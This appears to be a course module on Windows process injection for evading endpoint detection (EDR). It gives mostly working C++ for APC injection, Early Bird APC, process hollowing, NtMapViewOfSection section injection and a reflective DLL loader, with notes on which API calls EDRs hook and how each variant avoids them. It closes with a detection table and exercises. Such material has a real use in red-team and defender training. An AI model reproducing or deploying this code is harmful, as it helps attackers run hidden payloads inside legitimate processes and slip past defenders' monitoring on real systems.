# Module 16 — Process Injection Variants

## Why injection variants matter

Your Module 05 taught the classic injection triad:
`VirtualAllocEx + WriteProcessMemory + CreateRemoteThread`

Modern EDRs hook `CreateRemoteThread` and will alert on it immediately.
Every variant in this module exists to achieve the same goal — get your code
running inside another process — while avoiding that specific detection.

---

## 1. The Injection Threat Model

What EDRs watch for:
```
1. OpenProcess with PROCESS_VM_WRITE + PROCESS_CREATE_THREAD on a remote PID
2. VirtualAllocEx with PAGE_EXECUTE_READWRITE in a remote process
3. CreateRemoteThread targeting a remote process
4. WriteProcessMemory to executable memory
5. SetWindowsHookEx registering a global hook
```

Goal: achieve code execution without triggering items 2, 3, or 4 together.

---

## 2. APC Injection

An Asynchronous Procedure Call (APC) is a function queued to execute
in the context of a specific thread — but ONLY when that thread enters
an "alertable wait state" (SleepEx, WaitForSingleObjectEx, etc.).

```
Normal CreateRemoteThread:
  Attacker → CreateRemoteThread(hProcess, shellcode) → new thread, very visible

APC Injection:
  Attacker → QueueUserAPC(shellcode, hThread, 0)
           → shellcode runs NEXT TIME hThread calls SleepEx/WaitForSingleObjectEx
           → no new thread created — runs inside existing thread
```

**Code pattern:**

```cpp
#include <windows.h>
#include <tlhelp32.h>

// Step 1: Find a thread in the target process that enters alertable waits
// (Explorer, svchost, notepad all have such threads)
HANDLE findAlertableThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(te) };
    HANDLE result = nullptr;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    result = hThread;  // take the first one — refine in practice
                    break;
                }
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return result;
}

bool apcInject(DWORD pid, const BYTE* shellcode, size_t shellcodeLen) {
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProcess) return false;

    // Allocate RWX memory (still needed — use RX after write to reduce signature)
    LPVOID remoteMem = VirtualAllocEx(hProcess, nullptr, shellcodeLen,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) { CloseHandle(hProcess); return false; }

    WriteProcessMemory(hProcess, remoteMem, shellcode, shellcodeLen, nullptr);

    // Change to RX only — no longer writable
    DWORD oldProtect;
    VirtualProtectEx(hProcess, remoteMem, shellcodeLen, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE hThread = findAlertableThread(pid);
    if (!hThread) { CloseHandle(hProcess); return false; }

    // Queue the APC — shellcode runs when hThread next calls SleepEx etc.
    QueueUserAPC((PAPCFUNC)remoteMem, hThread, 0);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}
```

**Limitation:** APC only fires when the target thread is alertable.
For targets that never go alertable (tight CPU loops), this fails.

**Early Bird APC** — more reliable variant:
Create the target process in SUSPENDED state (`CREATE_SUSPENDED`), then:
1. Before the process's main thread has even run, it WILL call alertable
   functions during initialization.
2. Queue the APC to the suspended thread.
3. Resume the thread — APC fires before any user code runs.

```cpp
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi = {};
CreateProcessA("C:\\Windows\\System32\\notepad.exe", nullptr, nullptr, nullptr,
               FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi);

// Allocate + write shellcode into pi.hProcess
// ...

// Queue to the MAIN thread which is suspended
QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0);

// Resume — APC fires first, before notepad's main() runs
ResumeThread(pi.hThread);
```

---

## 3. Process Hollowing

Create a legitimate process in SUSPENDED state, then REPLACE its code with
your payload. The process runs under the legitimate process's name/path.

```
Goal: Task Manager shows "svchost.exe" but it's running your code.

Steps:
  1. CreateProcess(target, ..., CREATE_SUSPENDED) → pi.hProcess suspended
  2. ZwQueryInformationProcess → get PEB address in remote process
  3. Read PEB → get ImageBaseAddress (where the PE is mapped)
  4. NtUnmapViewOfSection → unmap the legitimate PE from the process
  5. VirtualAllocEx at the same ImageBaseAddress
  6. Write your PE's headers + sections into the remote process
  7. Fix relocations if loaded at a different base
  8. SetThreadContext → set RIP/EIP to your PE's entry point
  9. ResumeThread → process starts executing your code
```

```cpp
#include <windows.h>
#include <winternl.h>

// ZwQueryInformationProcess is undocumented — declare it manually
typedef NTSTATUS (NTAPI *pfnZwQueryInformationProcess)(
    HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

bool processHollow(const char* targetPath, const BYTE* payload, size_t payloadLen) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    // Create target in suspended state
    if (!CreateProcessA(targetPath, nullptr, nullptr, nullptr,
                        FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
        return false;

    // Get ZwQueryInformationProcess from ntdll
    auto pfn = (pfnZwQueryInformationProcess)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "ZwQueryInformationProcess");

    // Get PEB address
    PROCESS_BASIC_INFORMATION pbi = {};
    pfn(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), nullptr);

    // Read ImageBaseAddress from PEB
    // PEB offset 0x10 on x64 = ImageBaseAddress
    PVOID pebBase = pbi.PebBaseAddress;
    PVOID imageBase = nullptr;
    ReadProcessMemory(pi.hProcess,
                      (PBYTE)pebBase + 0x10,  // PEB->ImageBaseAddress
                      &imageBase, sizeof(imageBase), nullptr);

    // Unmap the original executable
    auto NtUnmap = (NTSTATUS(NTAPI*)(HANDLE, PVOID))GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection");
    NtUnmap(pi.hProcess, imageBase);

    // Parse payload PE headers
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)payload;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(payload + dos->e_lfanew);

    ULONGLONG preferredBase = nt->OptionalHeader.ImageBase;
    DWORD imageSize         = nt->OptionalHeader.SizeOfImage;

    // Allocate space for payload in the hollowed process
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, (LPVOID)preferredBase,
                                       imageSize, MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    if (!remoteMem) { TerminateProcess(pi.hProcess, 1); return false; }

    // Write headers
    WriteProcessMemory(pi.hProcess, remoteMem, payload,
                       nt->OptionalHeader.SizeOfHeaders, nullptr);

    // Write each section
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
                           (PBYTE)remoteMem + sections[i].VirtualAddress,
                           payload + sections[i].PointerToRawData,
                           sections[i].SizeOfRawData, nullptr);
    }

    // Update PEB ImageBaseAddress to point to new base
    WriteProcessMemory(pi.hProcess, (PBYTE)pebBase + 0x10,
                       &remoteMem, sizeof(remoteMem), nullptr);

    // Set entry point: RCX in thread context on x64
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Rcx = (DWORD64)remoteMem + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    // Resume
    ResumeThread(pi.hThread);
    return true;
}
```

**Why EDRs still catch this:** NtUnmapViewOfSection on own process is
highly anomalous. EDRs hook it. Combine with Section-based loading (below)
to avoid.

---

## 4. Section-based Injection (NtMapViewOfSection)

Instead of VirtualAllocEx + WriteProcessMemory, create a shared memory
section and map it into both processes. Less API calls = lower EDR visibility.

```
Normal:  VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
Section: NtCreateSection → NtMapViewOfSection(local) → NtMapViewOfSection(remote)
         → write payload locally → unmap local → remote thread/APC
```

```cpp
// Both functions are undocumented ntdll exports
typedef NTSTATUS (NTAPI *pfnNtCreateSection)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER,
    ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *pfnNtMapViewOfSection)(
    HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
    PSIZE_T, DWORD, ULONG, ULONG);

bool sectionInject(HANDLE hProcess, const BYTE* shellcode, size_t shellcodeLen) {
    auto NtCreateSection = (pfnNtCreateSection)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtCreateSection");
    auto NtMapViewOfSection = (pfnNtMapViewOfSection)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtMapViewOfSection");

    HANDLE hSection = nullptr;
    LARGE_INTEGER secSize = {};
    secSize.QuadPart = shellcodeLen;

    // Create a SEC_COMMIT | PAGE_EXECUTE_READWRITE section
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, &secSize,
                    PAGE_EXECUTE_READWRITE, SEC_COMMIT, nullptr);

    // Map into local process (RW for writing)
    PVOID localBase = nullptr;
    SIZE_T viewSize = 0;
    NtMapViewOfSection(hSection, GetCurrentProcess(), &localBase,
                       0, 0, nullptr, &viewSize, 1 /*ViewShare*/, 0, PAGE_READWRITE);

    // Write shellcode locally
    memcpy(localBase, shellcode, shellcodeLen);

    // Map into remote process (RX for execution)
    PVOID remoteBase = nullptr;
    viewSize = 0;
    NtMapViewOfSection(hSection, hProcess, &remoteBase,
                       0, 0, nullptr, &viewSize, 1, 0, PAGE_EXECUTE_READ);

    CloseHandle(hSection);

    // Now remoteBase in hProcess points to our shellcode
    // Use APC or other technique to execute it
    return true;
}
```

---

## 5. Reflective DLL Injection

Load a DLL from a memory buffer — no `LoadLibrary`, no disk write, no module list entry.

**How it works:**
1. You have a DLL as a byte array in memory (received from C2, stored as resource, etc.)
2. The DLL contains a special exported function: `ReflectiveLoader`
3. You allocate memory in the target process, copy the raw DLL bytes there
4. You call the `ReflectiveLoader` function directly (by offset within the bytes)
5. `ReflectiveLoader` does what `LoadLibrary` normally does: parses its own
   headers, maps sections, processes imports, applies relocations, calls DllMain

```
Standard LoadLibrary path:
  DISK → kernel reads PE → maps sections → fixes imports → DllMain

Reflective path:
  MEMORY → ReflectiveLoader parses its own bytes → maps sections → fixes imports → DllMain
  No disk. No LoadLibrary. Does NOT appear in PEB module list.
```

**ReflectiveLoader implementation** (simplified concept):

```cpp
// Inside the DLL being injected — this is the DLL's own bootstrap function
// It must be position-independent (no global vars, resolve its own imports)
DWORD WINAPI ReflectiveLoader() {
    // 1. Find our own base address by walking back from RIP
    //    (use a trick: call a function, get its address, walk back to DOS header)
    PBYTE base = findOwnBase();  // find MZ header by scanning backwards

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);

    // 2. Allocate a new region of the right size
    //    (must resolve VirtualAlloc manually — no imports yet!)
    HMODULE hKernel32  = getKernel32Base();  // find via PEB->Ldr
    pfnVirtualAlloc VAlloc = (pfnVirtualAlloc)getProcByHash(hKernel32, HASH_VIRTUALALLOC);

    PBYTE newBase = (PBYTE)VAlloc(nullptr, nt->OptionalHeader.SizeOfImage,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // 3. Copy headers + sections from our current location to newBase
    copyHeaders(base, newBase);
    copySections(base, newBase, nt);

    // 4. Process base relocations (delta = newBase - nt->OptionalHeader.ImageBase)
    applyRelocations(newBase, nt, (DWORD_PTR)newBase - nt->OptionalHeader.ImageBase);

    // 5. Resolve imports (walk IAT, find each DLL, resolve each function)
    resolveImports(newBase, nt);

    // 6. Call DllMain
    DllEntryPoint entry = (DllEntryPoint)(newBase + nt->OptionalHeader.AddressOfEntryPoint);
    entry((HINSTANCE)newBase, DLL_PROCESS_ATTACH, nullptr);

    return 0;
}
```

**Key insight:** steps 4 and 5 are exactly what the Windows PE loader does.
You're reimplementing the loader inside the DLL itself.

The attacker side just needs to:
1. Find the offset of `ReflectiveLoader` in the raw DLL bytes
2. Write the DLL into the target process
3. `CreateRemoteThread(hProcess, offset_of_ReflectiveLoader, ...)` — one call

---

## 6. Detection Summary

| Technique | What it avoids | What EDR still sees |
|-----------|---------------|---------------------|
| Classic inject | — | VirtualAllocEx RWX + CRT |
| APC inject | CreateRemoteThread | VirtualAllocEx RWX, QueueUserAPC |
| Early Bird APC | alertable-wait requirement | CREATE_SUSPENDED + QueueUserAPC |
| Process hollow | legitimate process image | NtUnmapViewOfSection |
| Section inject | VirtualAllocEx + WriteProcessMemory | NtCreateSection + NtMapViewOfSection |
| Reflective DLL | LoadLibrary, disk write, module list | WriteProcessMemory + CRT or QueueUserAPC |

There is no perfect technique. The goal is to raise the cost of detection
above the cost of response time for the defender.

---

## Exercises

- `ex01_apc_inject.cpp` — APC injection into a target PID
- `ex02_early_bird.cpp` — Early Bird APC into a newly created suspended process
- `ex03_process_hollow.cpp` — Process hollowing skeleton (concept + partial)
- `ex04_section_inject.cpp` — NtCreateSection / NtMapViewOfSection inject
